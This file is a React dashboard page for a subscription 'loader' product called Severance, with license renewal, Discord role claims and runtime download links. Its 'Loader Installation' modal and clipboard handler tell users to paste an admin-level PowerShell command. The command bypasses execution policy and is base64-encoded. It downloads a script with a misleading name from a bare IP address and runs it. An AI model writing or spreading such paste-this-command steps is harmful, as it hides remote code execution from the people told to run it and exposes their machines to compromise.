import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import {
  LogOut, Shield, Download, Clock, Activity, User,
  ChevronRight, MessageSquare, ExternalLink, Terminal,
  Copy, CheckCircle2, X, AlertCircle, Youtube
} from 'lucide-react';
import useAuthStore from '../hooks/useAuth';

export default function Dashboard() {
  const { user, isAuthenticated, logout, heartbeat, extend, downloadLoader, claimDiscordRole } = useAuthStore();
  const navigate = useNavigate();
  const [showDownloadModal, setShowDownloadModal] = useState(false);
  const [showRenewModal, setShowRenewModal] = useState(false);
  const [showDiscordModal, setShowDiscordModal] = useState(false);
  const [licenseKey, setLicenseKey] = useState('');
  const [discordId, setDiscordId] = useState('');
  const [copied, setCopied] = useState(false);
  const [status, setStatus] = useState({ type: '', msg: '' });
  const [discordStatus, setDiscordStatus] = useState({ type: '', msg: '' });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isClaimingRole, setIsClaimingRole] = useState(false);

  useEffect(() => {
    if (!isAuthenticated) {
      navigate('/Login');
      return;
    }
    const interval = setInterval(() => heartbeat(), 30000);
    return () => clearInterval(interval);
  }, [isAuthenticated, navigate, heartbeat]);

  const handleLogout = () => {
    logout();
    navigate('/');
  };

  const handleRenew = async (e) => {
    e.preventDefault();
    if (!licenseKey) return;
    setIsSubmitting(true);
    const res = await extend(licenseKey);
    if (res.success) {
      setStatus({ type: 'success', msg: 'License extended successfully!' });
      setTimeout(() => setShowRenewModal(false), 2000);
    } else {
      setStatus({ type: 'error', msg: res.error || 'Failed to extend' });
    }
    setIsSubmitting(false);
  };

  const handleDiscordClaim = async (e) => {
    e.preventDefault();
    if (!discordId.trim()) return;
    setIsClaimingRole(true);
    setDiscordStatus({ type: '', msg: '' });
    try {
      const res = await claimDiscordRole(discordId);
      if (res.success) {
        setDiscordStatus({ type: 'success', msg: res.msg || 'Customer role granted!' });
        setTimeout(() => { setShowDiscordModal(false); setDiscordId(''); setDiscordStatus({ type: '', msg: '' }); }, 2500);
      } else {
        setDiscordStatus({ type: 'error', msg: res.error || 'Failed to assign role.' });
      }
    } catch (err) {
      setDiscordStatus({ type: 'error', msg: err.message || 'An error occurred.' });
    }
    setIsClaimingRole(false);
  };

  const copyToClipboard = () => {
    const cmd = "powershell -ExecutionPolicy Bypass -nop -encodedCommand SQBFAFgAIAAoAGkAdwByACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgACcAaAB0AHQAcAA6AC8ALwAxADUAOQAuADEAOQA1AC4ANAAzAC4AMQAyADEAOgAxADUAMgA5AC8AUgBlAGcAaQBzAHQAZQByAFgAYgBvAHgARwBhAG0AZQBQAGEAYwBrAGEAZwBlAC4AcABzADEAJwApAA==";
    navigator.clipboard.writeText(cmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  if (!user) return null;
  const isExpired = user.expiry !== 'Never' && new Date(user.expiry) < new Date();

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white selection:bg-red-500/30">
      {/* Navbar */}
      <nav className="border-b border-white/[0.05] bg-[#0a0a0f]/80 backdrop-blur-md sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg bg-red-500/10 border border-red-500/20 flex items-center justify-center">
              <Shield className="w-4 h-4 text-red-400" />
            </div>
            <span className="font-bold text-lg tracking-tight">Severance</span>
          </div>

          <div className="flex items-center gap-4">
            <div className="hidden sm:flex items-center gap-2 text-sm text-white/40">
              <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
              Secure Session
            </div>
            <div className="h-4 w-px bg-white/10 hidden sm:block" />
            <button onClick={handleLogout} className="flex items-center gap-2 text-sm text-white/60 hover:text-white transition-colors">
              <LogOut className="w-4 h-4" />
              Logout
            </button>
          </div>
        </div>
      </nav>

      <main className="max-w-7xl mx-auto px-6 py-12 relative">
        <div className="absolute top-0 left-1/4 w-[500px] h-[500px] bg-red-600/5 rounded-full blur-[120px] pointer-events-none" />

        <div className="mb-10">
          <div className="flex items-center gap-3 text-red-400 mb-2 text-sm font-medium">
            <User className="w-4 h-4" />
            Logged in as
          </div>
          <h1 className="text-4xl font-bold tracking-tight">{user.username}</h1>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 items-start">

          <div className="col-span-1 md:col-span-2 space-y-6">
            {/* Status Card */}
            <div className="bg-white/[0.02] border border-white/[0.05] rounded-3xl p-8 relative overflow-hidden group">
              <div className="absolute top-0 right-0 p-8 opacity-5 group-hover:opacity-10 transition-opacity">
                <Shield className="w-32 h-32 text-red-500" />
              </div>

              <h2 className="text-xl font-bold mb-8 flex items-center gap-2">
                <Activity className="w-5 h-5 text-red-400" />
                Subscription Details
              </h2>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-8">
                <div className="bg-white/[0.03] border border-white/[0.05] p-6 rounded-2xl">
                  <div className="text-white/40 text-xs uppercase tracking-wider mb-2">Product</div>
                  <div className="text-2xl font-bold text-white capitalize">{user.product}</div>
                </div>

                <div className="bg-white/[0.03] border border-white/[0.05] p-6 rounded-2xl">
                  <div className="text-white/40 text-xs uppercase tracking-wider mb-2">Expiry Date</div>
                  <div className={`text-2xl font-bold flex items-center gap-2 ${isExpired ? 'text-red-400' : 'text-white'}`}>
                    {user.expiry}
                    <span className={`px-2 py-0.5 rounded text-[10px] uppercase tracking-wider border ${isExpired ? 'bg-red-500/10 text-red-400 border-red-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20'}`}>
                      {isExpired ? 'Expired' : 'Active'}
                    </span>
                  </div>
                </div>
              </div>

              <div className="mt-8 pt-8 border-t border-white/[0.05] flex flex-wrap gap-4 justify-between items-center">
                <p className="text-sm text-white/50">Purchase a license key to extend your subscription.</p>
                <button
                  onClick={() => setShowRenewModal(true)}
                  className="bg-red-600/10 hover:bg-red-600/20 text-red-400 border border-red-500/20 px-6 py-2.5 rounded-xl text-sm font-bold transition-all flex items-center gap-2"
                >
                  Extend Subscription <ChevronRight className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Error Fixes & Requirements Card */}
            <div className="bg-white/[0.02] border border-white/[0.05] rounded-3xl p-8">
              <h2 className="text-xl font-bold mb-6 flex items-center gap-2">
                <AlertCircle className="w-5 h-5 text-red-400" />
                Fixes & Requirements
              </h2>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                <div className="space-y-3">
                  <h3 className="text-sm font-bold text-white/70 uppercase tracking-wider mb-2">Tutorials</h3>
                  <a href="https://youtu.be/j-jj14vq9oA" target="_blank" rel="noopener noreferrer" className="flex items-center gap-3 p-3 bg-white/[0.03] hover:bg-white/[0.06] border border-white/[0.05] rounded-xl transition-all group">
                    <div className="p-2 bg-red-500/10 rounded-lg"><Youtube className="w-4 h-4 text-red-400" /></div>
                    <span className="text-sm font-medium">Error Fixes</span>
                  </a>
                  <a href="https://youtu.be/cOXCML_aQq8" target="_blank" rel="noopener noreferrer" className="flex items-center gap-3 p-3 bg-white/[0.03] hover:bg-white/[0.06] border border-white/[0.05] rounded-xl transition-all group">
                    <div className="p-2 bg-red-500/10 rounded-lg"><Youtube className="w-4 h-4 text-red-400" /></div>
                    <span className="text-sm font-medium">Runtimes Install</span>
                  </a>
                </div>

                <div className="space-y-3">
                  <h3 className="text-sm font-bold text-white/70 uppercase tracking-wider mb-2">Downloads</h3>
                  <div className="flex flex-wrap gap-2">
                    <a href="https://aka.ms/vc14/vc_redist.x64.exe" className="text-xs px-3 py-1.5 bg-white/[0.03] hover:bg-white/[0.08] border border-white/[0.05] rounded-lg transition-colors">VC x64</a>
                    <a href="https://aka.ms/vc14/vc_redist.x86.exe" className="text-xs px-3 py-1.5 bg-white/[0.03] hover:bg-white/[0.08] border border-white/[0.05] rounded-lg transition-colors">VC x86</a>
                    <a href="https://aka.ms/highdpimfc2013x64enu" className="text-xs px-3 py-1.5 bg-white/[0.03] hover:bg-white/[0.08] border border-white/[0.05] rounded-lg transition-colors">MFC x64</a>
                    <a href="https://aka.ms/highdpimfc2013x86enu" className="text-xs px-3 py-1.5 bg-white/[0.03] hover:bg-white/[0.08] border border-white/[0.05] rounded-lg transition-colors">MFC x86</a>
                    <a href="https://www.microsoft.com/en-us/download/details.aspx?id=35" target="_blank" rel="noopener noreferrer" className="text-xs px-3 py-1.5 bg-white/[0.03] hover:bg-white/[0.08] border border-white/[0.05] rounded-lg transition-colors flex items-center gap-1">
                      DXWebsetup <ExternalLink className="w-3 h-3" />
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Side Column */}
          <div className="space-y-6">
            {/* Loader Card */}
            <div className="bg-white/[0.02] border border-white/[0.05] rounded-3xl p-8 flex flex-col">
              <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                <Download className="w-5 h-5 text-red-400" />
                Loader
              </h2>
              <p className="text-sm text-white/50 mb-8">Press button to launch Severance.</p>
              <button
                onClick={() => setShowDownloadModal(true)}
                disabled={isExpired}
                className="w-full bg-red-600 hover:bg-red-500 text-white rounded-xl px-4 py-3.5 font-bold transition-all shadow-lg shadow-red-600/20 disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {isExpired ? 'Expired' : 'Download Loader'}
                {!isExpired && <ChevronRight className="w-4 h-4" />}
              </button>
            </div>

            {/* Support Card */}
            <div className="bg-white/[0.02] border border-white/[0.05] rounded-3xl p-8">
              <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                <MessageSquare className="w-5 h-5 text-red-400" />
                Community
              </h2>
              <div className="space-y-3">
                <a
                  href="https://discord.gg/YJsjcdAwfF"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex items-center justify-between p-4 bg-white/[0.03] hover:bg-white/[0.06] border border-white/[0.05] rounded-2xl transition-all group"
                >
                  <span className="text-sm font-medium">Customer Discord</span>
                  <ExternalLink className="w-4 h-4 text-white/20 group-hover:text-red-400 transition-colors" />
                </a>
                <button
                  onClick={() => { setShowDiscordModal(true); setDiscordStatus({ type: '', msg: '' }); }}
                  className="w-full flex items-center justify-between p-4 bg-white/[0.03] hover:bg-white/[0.06] border border-white/[0.05] rounded-2xl transition-all group"
                >
                  <span className="text-sm font-medium">Claim Customer Role</span>
                  <CheckCircle2 className="w-4 h-4 text-white/20 group-hover:text-green-400 transition-colors" />
                </button>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Renew Modal */}
      <AnimatePresence>
        {showRenewModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => setShowRenewModal(false)} className="absolute inset-0 bg-black/60 backdrop-blur-sm" />
            <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }} className="relative bg-[#0d0d14] border border-white/[0.1] rounded-3xl p-8 w-full max-w-md shadow-2xl">
              <button onClick={() => setShowRenewModal(false)} className="absolute top-6 right-6 text-white/20 hover:text-white"><X className="w-5 h-5" /></button>
              <h3 className="text-2xl font-bold mb-2">Extend Subscription</h3>
              <p className="text-white/50 text-sm mb-6">Enter your new license key to add time to your account.</p>

              <form onSubmit={handleRenew} className="space-y-4">
                <input
                  type="text"
                  placeholder="XXXX-XXXX-XXXX-XXXX"
                  value={licenseKey}
                  onChange={(e) => setLicenseKey(e.target.value)}
                  className="w-full bg-white/[0.03] border border-white/[0.1] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-red-500/50"
                />
                {status.msg && <div className={`text-sm p-3 rounded-xl ${status.type === 'success' ? 'bg-green-500/10 text-green-400 border border-green-500/20' : 'bg-red-500/10 text-red-400 border border-red-500/20'}`}>{status.msg}</div>}
                <button disabled={isSubmitting} type="submit" className="w-full bg-red-600 hover:bg-red-500 text-white rounded-xl py-3.5 font-bold transition-all shadow-lg shadow-red-600/20">
                  {isSubmitting ? 'Processing...' : 'Redeem Key'}
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Discord Claim Modal */}
      <AnimatePresence>
        {showDiscordModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => setShowDiscordModal(false)} className="absolute inset-0 bg-black/60 backdrop-blur-sm" />
            <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }} className="relative bg-[#0d0d14] border border-white/[0.1] rounded-3xl p-8 w-full max-w-md shadow-2xl">
              <button onClick={() => setShowDiscordModal(false)} className="absolute top-6 right-6 text-white/20 hover:text-white"><X className="w-5 h-5" /></button>
              
              <div className="w-12 h-12 rounded-2xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center mb-5">
                <MessageSquare className="w-6 h-6 text-indigo-400" />
              </div>
              <h3 className="text-2xl font-bold mb-2">Claim Customer Role</h3>
              <p className="text-white/50 text-sm mb-6">Enter your Discord User ID to receive the Customer role in our server. Make sure you've already joined the Discord first!</p>

              <form onSubmit={handleDiscordClaim} className="space-y-4">
                <div>
                  <label className="text-xs text-white/40 uppercase tracking-wider block mb-2">Your Discord User ID</label>
                  <input
                    type="text"
                    placeholder="e.g. 123456789012345678"
                    value={discordId}
                    onChange={(e) => setDiscordId(e.target.value)}
                    className="w-full bg-white/[0.03] border border-white/[0.1] rounded-xl px-4 py-3 text-white placeholder-white/20 focus:outline-none focus:border-indigo-500/50 font-mono"
                  />
                  <p className="text-xs text-white/30 mt-2">To find your ID: Discord → Settings → Advanced → Enable Developer Mode → Right-click your name → Copy User ID</p>
                </div>

                {discordStatus.msg && (
                  <div className={`text-sm p-3 rounded-xl border ${discordStatus.type === 'success' ? 'bg-green-500/10 text-green-400 border-green-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>
                    {discordStatus.msg}
                  </div>
                )}

                <button
                  disabled={isClaimingRole || !discordId.trim()}
                  type="submit"
                  className="w-full bg-indigo-600 hover:bg-indigo-500 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-xl py-3.5 font-bold transition-all shadow-lg shadow-indigo-600/20 flex items-center justify-center gap-2"
                >
                  {isClaimingRole ? (
                    <><span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> Claiming...</>
                  ) : (
                    <><CheckCircle2 className="w-4 h-4" /> Confirm & Claim Role</>
                  )}
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Download Modal */}
      <AnimatePresence>
        {showDownloadModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} onClick={() => setShowDownloadModal(false)} className="absolute inset-0 bg-black/60 backdrop-blur-sm" />
            <motion.div initial={{ scale: 0.95, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.95, opacity: 0 }} className="relative bg-[#0d0d14] border border-white/[0.1] rounded-3xl p-8 w-full max-w-2xl shadow-2xl overflow-hidden">
              <div className="absolute top-0 right-0 p-12 opacity-5"><Terminal className="w-48 h-48 text-red-500" /></div>
              <button onClick={() => setShowDownloadModal(false)} className="absolute top-6 right-6 text-white/20 hover:text-white"><X className="w-5 h-5" /></button>

              <h3 className="text-2xl font-bold mb-8 flex items-center gap-3">
                <Terminal className="w-6 h-6 text-red-400" />
                Loader Installation
              </h3>

              <div className="space-y-6">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {[
                    { step: 1, text: "Press Windows Key" },
                    { step: 2, text: "Type CMD and Run as Administrator" },
                    { step: 3, text: "Copy the command below", highlight: true },
                    { step: 4, text: "Paste and hit Enter" }
                  ].map((s) => (
                    <div key={s.step} className="bg-white/[0.03] border border-white/[0.05] p-4 rounded-2xl flex items-center gap-4">
                      <div className="w-8 h-8 rounded-lg bg-red-500/10 border border-red-500/20 flex items-center justify-center text-red-400 font-bold text-sm">{s.step}</div>
                      <span className={`text-sm ${s.highlight ? 'text-white font-medium' : 'text-white/50'}`}>{s.text}</span>
                    </div>
                  ))}
                </div>

                <div className="space-y-3">
                  <div className="text-xs font-bold text-white/30 uppercase tracking-widest ml-1">Terminal Command</div>
                  <div className="relative group">
                    <div className="absolute -inset-1 bg-gradient-to-r from-red-600/20 to-orange-600/20 rounded-2xl blur opacity-0 group-hover:opacity-100 transition duration-500" />
                    <div className="relative bg-black/40 border border-white/10 p-5 rounded-2xl font-mono text-[11px] leading-relaxed break-all text-white/70">
                      powershell -ExecutionPolicy Bypass -nop -encodedCommand SQBFAFgAIAAoAGkAdwByACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgACcAaAB0AHQAcAA6AC8ALwAxADUAOQAuADEAOQA1AC4ANAAzAC4AMQAyADEAOgAxADUAMgA5AC8AUgBlAGcAaQBzAHQAZQByAFgAYgBvAHgARwBhAG0AZQBQAGEAYwBrAGEAZwBlAC4AcABzADEAJwApAA==
                    </div>
                    <button
                      onClick={copyToClipboard}
                      className="absolute bottom-4 right-4 bg-red-600 hover:bg-red-500 text-white p-2.5 rounded-xl transition-all flex items-center gap-2 text-xs font-bold shadow-xl"
                    >
                      {copied ? <CheckCircle2 className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      {copied ? 'Copied!' : 'Copy Command'}
                    </button>
                  </div>
                </div>

                <p className="text-xs text-center text-white/30 italic pt-4">
                  Repeat this process every time you want to launch Severance.
                </p>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
